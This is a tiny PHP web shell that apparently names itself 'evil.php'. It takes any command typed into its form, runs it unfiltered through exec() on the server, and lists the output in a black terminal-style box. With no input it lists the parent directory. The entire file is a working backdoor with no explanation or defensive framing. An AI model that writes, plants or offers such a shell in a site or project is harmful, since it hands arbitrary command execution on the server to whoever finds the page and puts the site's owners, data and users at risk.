<?php
$cmd = $_POST['cmd']!=""? $_POST['cmd']:"";
exec($cmd==""?"cd ../ && ls":$cmd, $outs);
echo '<div style="width:500px;height:500px;overflow:scroll;background-color:black;color:white;font-size:10px;">';
foreach ($outs as $key => $out) {
    echo $out.'<br>';
}
echo '</div>';
echo "<form action='evil.php'method='post'><input id='cmd' name='cmd'style='width:463px' type='text'/><input type='submit' style='background-color:black;color:white;'/></form>";
